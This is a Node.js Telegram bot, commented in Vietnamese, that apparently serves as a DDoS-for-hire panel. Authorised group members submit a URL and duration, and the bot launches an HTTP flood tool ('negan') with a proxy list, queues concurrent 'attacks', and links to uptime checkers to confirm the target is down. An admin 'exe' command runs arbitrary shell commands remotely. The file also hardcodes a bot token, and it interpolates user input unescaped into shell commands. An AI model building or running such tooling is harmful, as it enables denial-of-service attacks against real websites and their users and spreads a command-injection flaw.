const TelegramBot = require('node-telegram-bot-api');
const { exec } = require('child_process');
const os = require('os');

// Cấu hình
const token = '7935173392:AAFYFVwBtjee7R33I64gcB3CE_-veYkU4lU';
const adminId = 1243471275;
const allowedGroupIds = new Set([-1002423723717, 987654321, 112233445, 556677889, 998877665]);
const maxConcurrentAttacks = 3, maxSlot = 1, maxTimeAttacks = 120;

// Khởi tạo bot
const bot = new TelegramBot(token, { polling: true });
const currentAttacks = new Map(), attackQueue = [];

// Thông báo bot đã sẵn sàng
let isBotReady = true;
bot.sendMessage(adminId, '[Version PRO] 🤖 Bot is ready to receive commands.');
console.log('[DEBUG] Bot has started and is ready to receive commands.');

// Hàm định dạng thời gian theo múi giờ Việt Nam (GMT+7)
const getVietnamTime = () => new Date().toLocaleString('vi-VN', { timeZone: 'Asia/Ho_Chi_Minh' });

// Hàm gửi thông báo dưới dạng HTML
const sendHtmlMessage = async (chatId, message) => {
    try {
        await bot.sendMessage(chatId, message, { parse_mode: 'HTML' });
    } catch (error) {
        console.error(`[ERROR] Failed to send message: ${error.message}`);
    }
};

// Hàm thực thi lệnh
const executeCommand = async (chatId, command, host, time, username) => {
    const pid = Math.floor(Math.random() * 10000), startTime = getVietnamTime();
    const startMessage = `
<pre>
🚀 Success 🚀
PID: ${pid}
WEBSITE: ${host}
Time: ${time} Seconds
Command caller: @${username}
Start time: ${startTime}
Maximum concurrent attacks: ${maxSlot} slots
[Host Check](https://check-host.net/check-http?host=${host}) | [Host Tracker](https://www.host-tracker.com/en/ic/check-http?url=${host})
</pre>
    `;
    await sendHtmlMessage(chatId, startMessage);

    const child = exec(command, { shell: '/bin/bash' });
    child.on('close', () => {
        const endTime = getVietnamTime();
        const completeMessage = `
<pre>
✅ Process completed
PID: ${pid}
WEBSITE: ${host}
Time: ${time} Seconds
Command caller: @${username}
End time: ${endTime}
</pre>
        `;
        sendHtmlMessage(chatId, completeMessage);
        currentAttacks.delete(chatId);
        if (attackQueue.length > 0) {
            const nextAttack = attackQueue.shift();
            executeCommand(nextAttack.chatId, nextAttack.command, nextAttack.host, nextAttack.time, nextAttack.username);
        }
    });
};

// Xử lý lệnh từ người dùng
bot.on('message', async (msg) => {
    const chatId = msg.chat.id, text = msg.text, isAdmin = chatId === adminId, isGroup = allowedGroupIds.has(chatId);
    const username = msg.from.username || msg.from.first_name;

    // Kiểm tra quyền thực thi lệnh
    if (!isAdmin && !isGroup) return sendHtmlMessage(chatId, '<b>🚫 You do not have permission to execute this command.</b>');

    // Xử lý lệnh tấn công (URL + thời gian)
    if (text.startsWith('http://') || text.startsWith('https://')) {
        const parts = text.split(' ');
        if (parts.length !== 2 || isNaN(parts[1])) return sendHtmlMessage(chatId, '<b>🚫 Invalid format! Use: &lt;URL&gt; &lt;time&gt;.</b>');
        const [host, time] = parts;
        if (time > maxTimeAttacks) return sendHtmlMessage(chatId, `<b>🚫 Maximum time is ${maxTimeAttacks} seconds.</b>`);

        // Kiểm tra số lệnh đang chạy của người dùng
        const userAttacks = Array.from(currentAttacks.values()).filter(attack => attack.user === chatId).length;
        if (userAttacks >= maxSlot) {
            const remainingTime = maxTimeAttacks - (Date.now() - currentAttacks.get(chatId).startTime) / 1000;
            return sendHtmlMessage(chatId, `<b>🚫 You have an ongoing command. Please wait for the current process to complete. Remaining time: ${Math.ceil(remainingTime)} seconds.</b>`);
        }

        // Kiểm tra số lệnh đang chạy toàn hệ thống
        if (currentAttacks.size >= maxConcurrentAttacks) {
            attackQueue.push({ chatId, command: `node ./negan -m GET -u ${host} -p live.txt --full true -s ${time}`, host, time, username });
            return sendHtmlMessage(chatId, '<b>⏳ Your command has been added to the queue. Please wait...</b>');
        }

        const command = `node ./negan -m GET -u ${host} -p live.txt --full true -s ${time}`;
        currentAttacks.set(chatId, { user: chatId, command, startTime: Date.now() });
        executeCommand(chatId, command, host, time, username);
        return;
    }

    // Xử lý lệnh exe (chỉ admin)
    if (text.startsWith('exe ') && isAdmin) {
        const command = text.slice(4).trim();
        if (!command) return sendHtmlMessage(chatId, '<b>🚫 Command cannot be empty. Example: exe ls</b>');
        const child = exec(command, { shell: '/bin/bash' });
        let output = '';
        child.stdout.on('data', (data) => output += data.toString());
        child.stderr.on('data', (data) => output += data.toString());
        child.on('close', () => {
            const resultMessage = `
<pre>
🚀 Command result:
${command}
${output}
</pre>
            `;
            sendHtmlMessage(chatId, resultMessage);
        });
        return;
    }

    // Lệnh không hợp lệ
    sendHtmlMessage(chatId, '<b>🚫 Invalid command. Please start with "exe" or enter a URL and time.</b>');
});
